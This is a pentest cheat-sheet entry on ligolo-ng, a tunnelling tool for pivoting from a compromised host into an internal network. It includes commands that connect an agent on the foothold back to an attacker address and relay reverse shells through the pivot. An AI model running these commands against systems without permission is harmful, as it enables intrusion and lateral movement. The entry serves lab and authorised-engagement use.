---
tool: ligolo-ng
slug: ligolo-ng
stages: [command-and-control]
category: Tunnelling and pivoting
platforms: [linux, windows, network]
services: []
ports: [11601]
tags: [pivoting, tunnelling, pivot, proxy, c2]
attack: [T1090, T1572]
summary: A VPN-style pivot. Instead of a SOCKS proxy and proxychains, it stands up a tun interface so your tools reach the internal network directly, at native speed and with no wrapper. The current go-to for pivoting once you have a foothold.
references:
  - ligolo-ng README | https://github.com/nicocha30/ligolo-ng
---

## When to reach for it

You have a shell on a host that can see a second network you cannot. ligolo-ng turns that host into a tunnel: you add a route for the internal subnet to a local `tun` interface and every tool (nmap, netexec, a browser) reaches it with no proxychains in front. It is the faster, cleaner alternative to chisel plus a SOCKS proxy.

## The two pieces

- `proxy`: runs on your attack box, opens the control listener (11601) and the `ligolo` interface.
- `agent`: runs on the compromised host and connects back to the proxy.

## Key flags

- Proxy: `-selfcert` (self-signed TLS for labs), `-laddr 0.0.0.0:11601` (listen address).
- Agent: `-connect ATTACKER:11601`, `-ignore-cert` (accept the self-signed cert in a lab).
- In the proxy session: `session` (pick an agent), `ifconfig` (its networks), `start`/`stop` (the tunnel), `listener_add` (relay a port back through the agent).

## Commands

Set up the interface and proxy on the attack box:

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

On the foothold, connect the agent back:

```bash
# upload the matching agent binary first, then:
./agent -connect 10.10.14.5:11601 -ignore-cert
```

In the proxy session, route the internal subnet through the tunnel:

```text
ligolo-ng » session           # select the agent
[Agent] » ifconfig            # read the agent's internal network, e.g. 172.16.5.0/24
# back on the attack box, in another terminal:
sudo ip route add 172.16.5.0/24 dev ligolo
# in the session:
[Agent] » start               # tunnel is up; your tools now reach 172.16.5.0/24
```

Relay a reverse shell from the internal network back to your handler:

```text
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

## Workflow

1. Get a foothold on the dual-homed host and note its internal network with `ifconfig`.
2. Start the proxy and the `ligolo` interface on your box; connect the agent back.
3. Add a route for the internal subnet to the `ligolo` interface, then `start`.
4. Run your normal tools against the internal range, no proxychains needed.
5. Use `listener_add` to catch reverse shells from hosts that can only reach the pivot.

## Notes

Match the agent binary to the foothold's OS and architecture. `-selfcert`/`-ignore-cert` are lab conveniences; a real engagement uses a proper certificate. Compared with chisel it needs no SOCKS wrapper and handles ICMP and full TCP/UDP, so nmap behaves normally through it. Keep the pivot and its route inside the engagement scope, and tear both down when you finish.
